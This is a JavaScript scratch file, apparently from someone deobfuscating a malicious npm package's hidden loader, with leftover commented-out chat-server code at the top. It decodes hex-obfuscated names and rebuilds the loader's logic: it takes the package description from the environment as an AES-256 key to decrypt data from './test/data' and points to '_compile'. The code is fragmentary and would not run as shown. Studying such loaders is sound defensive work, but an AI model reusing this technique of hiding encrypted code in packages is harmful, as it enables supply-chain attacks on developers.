// exports.listen = function (server) {
//   io = socketio.listen(server);
//   io.set('log level', 1);

//   io.sockets.on('connection', function (socket) {
//     guestNumber = assignGuestName(socket, guestNumber, nickNames, namesUsed);
//     joinRoom(socker, 'Lobby');
    
//     handleMessageBroadcasting(socket, nickNames);
//     handleNameChangeAttempts(socket, nickNames, namesUsed);
//     handleRoomJoining(socket);

//     socket.on('rooms', function() {
//       socket.emit('rooms', io.sockets.manager.rooms);
//     })

//     handleClientDisconnection(socket, nickNames, namesUsed);
//   })
// }
function hexToAscii(r) {
  return Buffer.from(r, "hex").toString()
}
console.log(hexToAscii('63727970746f'))
console.log(hexToAscii('656e76'))
console.log(hexToAscii('6e706d5f7061636b6167655f6465736372697074696f6e'))
console.log(hexToAscii('616573323536'))
console.log(hexToAscii('6372656174654465636970686572'))
console.log(hexToAscii('5f636f6d70696c65'))
console.log(hexToAscii('686578'))
console.log(hexToAscii('75746638'))

// var n = require(Buffer.from('2e2f746573742f64617461', "hex").toString())
// console.log(n)
// console.log(n[3])
// var N3 = n[3]
// var N4 = n[4]
// console.log(n[4])
// var eN3 = Buffer.from(N3, "hex").toString()
// console.log(eN3)
// var eN4 = Buffer.from(N3, "hex").toString()
// console.log(eN4)// Buffer.from(n[3], "hex").toString()][Buffer.from(n[4], "hex").toString()
var o = process["env"]["npm_package_description"];
        if (!o) return;
        var u = require("crypto")["createDecipher"]("aes256", o)
console.log(o)
console.log(u)
var a = u.update(n[0], "hex", "utf8")
console.log(a);
